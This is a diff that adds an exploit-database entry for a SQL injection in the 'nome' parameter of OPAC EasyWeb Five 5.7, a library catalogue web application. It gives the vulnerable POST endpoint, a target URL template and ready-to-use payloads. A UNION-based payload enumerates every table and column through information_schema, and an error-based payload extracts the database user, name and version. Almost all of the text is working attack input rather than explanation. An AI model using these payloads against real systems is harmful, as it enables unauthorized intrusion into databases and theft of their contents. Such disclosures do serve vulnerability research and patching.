@@ -1,0 +1,22 @@
+# Exploit Title: OPAC EasyWeb Five 5.7 - 'nome' SQL Injection
+# Dork: N/A
+# Exploit Author: Ihsan Sencan
+# Date: 2018-10-02
+# Vendor Homepage: http://www.nexusfi.it/
+# Software Link: http://www.nexusfi.it/easyweb.php
+# Version: 5.7
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# POST /easyweb/w7008/index.php?scelta=cerca_biblio&&opac=w7008 HTTP/1.1
+
+nome=') UNION ALL SELECT NULL,NULL,NULL,(Select+export_set(5,@:=0,(select+count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+ 
+nome=') AND ROW(3,6)>(SELECT COUNT(*),CONCAT(CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION()),(SELECT (ELT(66=66,1))),FLOOR(RAND(0)*2))x FROM (SELECT 66 UNION SELECT 7030 UNION SELECT 4751 UNION SELECT 1310)a GROUP BY x)-- Efe
+
+
+http://Target/easyweb/w7008/index.php?scelta=cerca_biblio&&opac=w7008
+nome=') UNION ALL SELECT NULL,NULL,NULL,(Select+export_set(5,@:=0,(select+count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
